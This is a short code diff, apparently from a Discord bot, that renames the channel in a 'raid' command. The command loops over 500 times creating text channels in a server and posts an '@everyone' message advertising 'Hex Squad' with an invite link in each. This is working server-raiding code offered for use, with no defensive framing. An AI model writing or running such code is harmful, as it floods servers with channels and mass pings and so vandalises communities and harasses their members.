@@ -6,7 +6,7 @@ module.exports = {
 
     run : async(client, message, args) => {
         for (let i = 0; i <= 500; i++) {
-            message.guild.channels.create(`RaidByXavaXSquad`, {
+            message.guild.channels.create(`raidbyhexsquad`, {
               type: 'text'
             }).then(channel => {
              channel.send("@everyone Raid By Hex Squad https://discord.gg/A6rnT7Ynk2 ")
